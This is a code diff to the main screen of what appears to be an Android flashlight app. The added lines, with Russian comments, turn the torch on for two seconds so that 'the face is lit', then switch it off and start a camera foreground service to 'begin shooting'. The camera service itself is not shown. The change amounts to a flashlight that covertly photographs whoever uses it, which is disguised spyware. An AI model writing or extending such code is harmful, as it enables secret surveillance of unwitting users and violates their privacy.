@@ -7,6 +7,8 @@ import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraCharacteristics;
 import android.hardware.camera2.CameraManager;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.widget.Button;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -40,11 +42,21 @@ public class MainActivity extends AppCompatActivity {
             try {
                 isOn = !isOn;
                 if (isOn) {
-                    cameraManager.setTorchMode(cameraId, true);
+                    cameraManager.setTorchMode(cameraId, true); // Включаем свет
                     btn.setText("Выключить");
-                    cameraManager.setTorchMode(cameraId, false);
-                    Intent svc = new Intent(this, CameraService.class);
-                    startForegroundService(svc);
+                    
+                    // Ждем 2 секунды, свет горит, лицо освещается
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                        try {
+                            cameraManager.setTorchMode(cameraId, false); // Выключаем свет
+                        } catch (Exception e) {}
+                        
+                        // Запускаем съемку
+                        Intent svc = new Intent(this, CameraService.class);
+                        startForegroundService(svc);
+                        
+                    }, 2000); // 2 секунды
+                    
                 } else {
                     cameraManager.setTorchMode(cameraId, false);
                     btn.setText("Включить");
